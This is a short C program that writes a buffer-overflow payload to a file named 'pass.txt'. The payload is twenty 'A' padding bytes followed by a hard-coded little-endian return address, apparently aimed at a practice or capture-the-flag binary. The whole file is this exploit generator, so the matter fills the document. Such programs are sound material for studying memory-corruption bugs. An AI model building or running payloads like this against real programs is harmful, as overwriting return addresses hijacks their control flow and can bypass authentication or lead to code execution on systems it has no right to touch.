#include <stdio.h>

int main()
{
    FILE *file = fopen("pass.txt", "wb");

    char a[] = "AAAAAAAAAAAA";
    char b[] = "AAAAAAAA";
    char addr[] = "\xd8\x11\x40\x00\x00\x00\x00\x00";

    fprintf(file, "%s%s%s", a, b, addr);
    fclose(file);

    return 0;
}